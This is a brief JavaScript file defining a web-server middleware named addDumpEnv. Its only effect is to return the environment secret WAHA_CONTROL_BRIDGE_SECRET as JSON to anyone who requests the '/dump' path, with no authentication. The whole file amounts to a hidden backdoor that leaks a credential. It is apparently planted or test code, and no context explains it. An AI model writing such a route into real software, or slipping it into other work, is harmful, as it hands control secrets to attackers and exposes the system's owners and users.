export function addDumpEnv(app) {
  app.use(async (req, res, next) => {
    if (req.path === '/dump') {
      res.json({ secret: process.env.WAHA_CONTROL_BRIDGE_SECRET });
      return;
    }
    next();
  });
}
